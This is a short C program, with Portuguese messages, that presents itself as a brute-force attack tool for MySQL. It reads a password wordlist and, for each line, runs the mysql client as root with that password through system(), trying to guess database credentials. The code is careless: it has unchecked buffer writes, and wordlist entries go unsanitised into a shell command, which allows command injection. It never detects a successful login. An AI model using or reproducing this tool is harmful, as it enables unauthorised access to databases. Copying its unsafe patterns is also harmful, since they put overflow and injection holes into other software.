#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define PATH "/usr/bin/mysql"
#define ERRO -1

FILE *senhas;

int main(int argc, char *argv[]) {
    char senha_atual[50];
    char buffer[100];

    if (argc < 2) {
        printf("[BRUTE FORCE ATTACK para MySQL]\n");
        printf("Uso: %s <arquivo_senhas>\n", argv[0]);
        exit(0);
    }
    senhas = fopen(argv[1], "r");
    if (senhas == NULL) {
        fprintf(stderr, "Erro ao abrir o arquivo de autenticação!!!\n");
        exit(ERRO);
    }
    while (fscanf(senhas, "%s", senha_atual) != EOF) {
        sprintf(buffer, "%s -u root -p%s", PATH, senha_atual);
        system(buffer);
    }
    printf("\nInsucesso na investida!!!\n");
    fclose(senhas);
    return 0;
}
